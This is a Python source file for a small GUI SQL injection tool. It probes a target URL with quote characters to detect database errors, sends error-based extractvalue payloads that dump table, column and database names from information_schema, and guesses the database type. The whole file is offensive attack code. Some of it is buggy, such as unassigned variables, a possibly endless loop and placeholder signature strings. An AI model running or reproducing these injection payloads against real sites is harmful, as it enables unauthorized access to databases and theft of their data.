import requests
from bs4 import BeautifulSoup as BS
import tkinter as tk

def _SCANBYMIKE_(test):
    urls = [test + "'", test + '"', test[:-4] + ';', test + ")", test + "')", test + '")', test + '*'] 
    vulnerable_text = ['MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result', 'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;', 'mssql_query()', "Incorrect s>"]
    try:
        for url in urls:
            results = requests.get(url)
            data = results.text
            soup = BS(data, features='html.parser')
            for vuln in vulnerable_text:
                    if vuln in data:
                        string = vuln
                        vulnerable = True
            if vulnerable:
                label_vulnerable = tk.Label(text="Is vulnerable")
                label_vulnerable.pack() #
                label_vulnerable.config(font=("Times New Roman", 24))
    except:
        label_vulnerable = tk.Label(text=" Site is not vulnerable")
        label_vulnerable.pack() #
        label_vulnerable.config(font=("Times New Roman", 24))

def _Dump_(self, tablenames):
        try:
            Dumping = tk.Label(text='Dumping the database')
            Dumping.pack() 

            extract = tk.Label(text='Extracting tables names...')
            extract.pack() 

            link = str(tablenames) + " and extractvalue(1,(select%20group_concat(table_name) from%20information_schema.tables where table_schema=database()))"
            results = requests.get(link)
            data = results.text 
            str_num = str(data).find('error: ')
            str1_num = data[str_num:]
            str1 = str1_num[8:]
            str2 = str1.find('\'')
            str3 = str1[:str2]
            # print(f"\nTable names: {str3}")
            self.tables_name = f"\nTable names: {str3}"
            Table_names = tk.Label(textvariable=self.tables_name)
            Table_names.pack() 


            print('Extracting Columns...')
            link = str(tablenames) + " and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='" + tablenames + "'limit 0,1)))--"
            results = requests.get(link)
            data = results.text
            self._Dump_database = f"Column names: {data}"
            label_dump = tk.Label(textvariable=self._Dump_database)
            label_dump.pack() #
            label_dump.config(font=("Times New Roman", 24))

            link = tablenames + " and extractvalue(1,concat(1,(select database()))) --" # " and extractvalue(0x0a,concat(0x0a,(select database())))--"
            print(link)
            results = requests.get(link)
            data = results.text 
            str_num = str(data).find('error:')
            print(str_num) 
            str1_num = data[str_num:]
            str1 = str1_num[8:]
            str2 = str1.find('\'')
            str3 = str1[:str2]
            if str_num == -1:
                # print('Access Denied')
                Access_Denied = tk.Label(text='Access Denied')
                Access_Denied.pack() 
            else:
                # print(f"Database name: {str3}")
                self.database_name = f"Database name: {str3}"
                Database_name = tk.Label(textvariable=self.database_name)
                Database_name.pack() 
        except:
            label_dump = tk.Label(text='Invalid URL')
            label_dump.pack() #
            label_dump.config(font=("Times New Roman", 24))


def _get_database_type_(self, get_database_type):
    try:
        urls = [get_database_type + "'", get_database_type + '"', get_database_type[:-4] + ';', get_database_type + ")", get_database_type + "')", get_database_type + '")', get_database_type + '*']
        DBDict = {
            "MySQL"             : ['MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax', 'mssql_query()', 'mssql_num_rows()'],
            "PostGre"           : ['dafafdfds'],
            "Microsoft_SQL"     : ['dafafdfds'],
            "Oracle"            : ['dafafdfds'],
            "Advantage_Database": ['dafafdfds'],
            "Firebird"          : ['dafafdfds']  
        }
        DBFound = 0
        DBType = ''
        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                while not DBFound:
                    for db, identifiers in DBDict.items():
                        for dbid in identifiers:
                            if dbid in data:
                                DBType = db
                                DBFound = 1
                                self.database_type = DBType
                                print(DBType)
                                DBType_label = tk.Label(textvariable=self.database_type)
                                DBType_label.pack() #
                                DBType_label.config(font=("Times New Roman", 24))
                                break
        except:
            Unknown = tk.Label(text='Database type: Unknown')
            Unknown.pack() 
    except:
        Invalid = tk.Label(text='Invalid Argument given!')
        Invalid.pack() 

